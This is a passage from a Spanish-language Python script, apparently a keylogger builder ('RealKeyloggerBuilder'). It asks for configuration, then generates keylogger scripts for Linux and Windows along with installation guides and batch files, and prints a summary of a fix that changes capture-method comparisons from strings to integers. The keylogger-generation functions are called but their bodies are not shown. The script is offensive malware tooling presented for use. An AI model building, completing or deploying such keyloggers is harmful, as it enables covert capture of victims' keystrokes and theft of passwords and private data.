==========================================================================
'''
        
        guide_file = f"GUIA_INSTALACION_FIXED_INT_{self.config['machine']}.txt"
        with open(guide_file, 'w', encoding='utf-8') as f:
            f.write(guide)
        
        print(f"[✓] Guía de instalación CORREGIDA (int) creada: {guide_file}")
        return guide_file
    
    def save_config(self):
        """Guarda la configuración"""
        config_file = f"config_{self.config['machine']}.json"
        with open(config_file, 'w') as f:
            json.dump(self.config, f, indent=4)
        
        print(f"[✓] Configuración guardada: {config_file}")
        return config_file
    
    def run(self):
        """Ejecuta el builder completo"""
        self.show_banner()
        
        # Obtener configuración
        self.get_user_input()
        
        # Guardar configuración
        self.save_config()
        
        print(f"\n{'='*60}")
        print("GENERANDO PROYECTO - COMPARACIONES INT CORREGIDAS")
        print('='*60)
        
        files_created = []
        
        # Generar keylogger Linux CORREGIDO (int)
        if self.config['platform'] in ['1', '3']:
            try:
                linux_file = self.generate_linux_keylogger_worker_fixed()
                files_created.append(linux_file)
            except Exception as e:
                print(f"[!] Error Linux: {e}")
        
        # Generar keylogger Windows con Worker
        if self.config['platform'] in ['2', '3']:
            try:
                windows_file = self.generate_windows_keylogger_worker()
                files_created.append(windows_file)
            except Exception as e:
                print(f"[!] Error Windows: {e}")
        
        # Crear guía de instalación CORREGIDA (int)
        try:
            guide_file = self.create_installation_guide_fixed_int()
            files_created.append(guide_file)
        except Exception as e:
            print(f"[!] Error guía: {e}")
        
        # Mostrar resumen final
        self.show_final_summary_fixed_int(files_created)
    
    def show_final_summary_fixed_int(self, files):
        """Muestra resumen final detallado con la corrección int"""
        print(f"\n{'='*60}")
        print("✅ PROYECTO COMPLETADO - COMPARACIONES INT CORREGIDAS")
        print('='*60)
        
        print(f"\n📋 CONFIGURACIÓN VERIFICADA:")
        print(f"   Máquina: {self.config['machine']}")
        print(f"   Método captura: {self.config['linux_capture_method']} (ENTERO)")
        print(f"   Tipo: {type(self.config['linux_capture_method']).__name__}")
        print(f"   Comparaciones: ✅ Corregidas (enteros en lugar de strings)")
        
        print(f"\n📁 ARCHIVOS CREADOS (con corrección int):")
        for file in files:
            if file and os.path.exists(file):
                try:
                    size = os.path.getsize(file) // 1024
                    if '_int_' in file:
                        icon = "🔧✅"  # Corregido
                    elif file.endswith('.py'):
                        icon = "🐍"
                    elif file.endswith('.txt'):
                        icon = "📄"
                    elif file.endswith('.bat'):
                        icon = "🅱️"
                    elif file.endswith('.sh'):
                        icon = "📋"
                    else:
                        icon = "⚙️"
                    print(f"   {icon} {file} ({size} KB)")
                except:
                    print(f"   📄 {file}")
        
        print(f"\n🚀 VERIFICACIÓN AUTOMÁTICA:")
        print(f"   1. Archivo Linux: linux_keylogger_fixed_int_{self.config['machine']}.py")
        print(f"   2. Método como entero: PREFERRED_CAPTURE_METHOD = {self.config['linux_capture_method']}")
        print(f"   3. Comparaciones: if PREFERRED_CAPTURE_METHOD == 4 (CORRECTO)")
        print(f"   4. NO: if PREFERRED_CAPTURE_METHOD == \"4\" (INCORRECTO)")
        
        print(f"\n🔧 CORRECCIÓN APLICADA:")
        print("   • PREFERRED_CAPTURE_METHOD definido como entero")
        print("   • Todas las comparaciones con enteros (no strings)")
        print("   • Script de instalación actualizado")
        print("   • Batch file con verificación de código")
        print("   • Guía detallada de la corrección")
        
        print(f"\n⚡ PRUEBA RÁPIDA DE LA CORRECCIÓN:")
        print(f"   Para verificar manualmente:")
        print(f"   grep -n 'PREFERRED_CAPTURE_METHOD == \\\"' linux_keylogger_fixed_int_*.py")
        print(f"   → Debe devolver 0 resultados")
        print(f"   grep -n 'PREFERRED_CAPTURE_METHOD == [0-9]' linux_keylogger_fixed_int_*.py")
        print(f"   → Debe devolver múltiples resultados")
        
        print(f"\n📖 Guía completa en: GUIA_INSTALACION_FIXED_INT_{self.config['machine']}.txt")
        
        print(f"\n{'='*60}")
        print("✅ LISTO - ¡Comparaciones con enteros CORREGIDAS!")
        print('='*60)

def main():
    """Función principal"""
    try:
        builder = RealKeyloggerBuilder()
        builder.run()
        
    except KeyboardInterrupt:
        print("\n[!] Cancelado por usuario")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()